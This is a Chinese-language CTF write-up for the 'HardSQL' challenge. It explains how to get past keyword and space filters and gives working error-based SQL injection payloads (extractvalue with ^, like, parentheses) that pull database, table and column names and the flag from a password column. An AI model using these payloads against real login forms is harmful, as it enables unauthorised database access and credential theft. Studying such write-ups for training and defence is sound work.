# \[极客大挑战 2019]HardSQL

## 考点

* 报错注入中可以使用 ^ 连接 extractvalue函数
* 注入Bypass
* \=使用like或regex绕过
* 空格使用()绕过

## wp

过滤了 and or = 空格\
\= 可以使用 like 绕过\
空格使用 () 绕过

查看当前数据库 `admin'^extractvalue(1,concat(0x7e,(select(database())),0x7e))#` 数据库为 geek

获取geek库中的表 `admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),0x7e))#`

比较关键的是 `H4rDsq1`

获取表中的列 `admin'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e))#`

表中的列是 `id,username,password`

测试了一下发现 flag 在 H4rDsq1 的第一个用户的 password 中

正序输出\
`admin'^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where((id)like('1'))),0x7e))#`

逆序输出\
`admin'^extractvalue(1,concat(0x7e,(select(reverse(password))from(H4rDsq1)where((id)like('1'))),0x7e))#`

拼接一下 flag 即可

这里其实没必要成功登陆，只要 sql 语句报错就可以进行注入
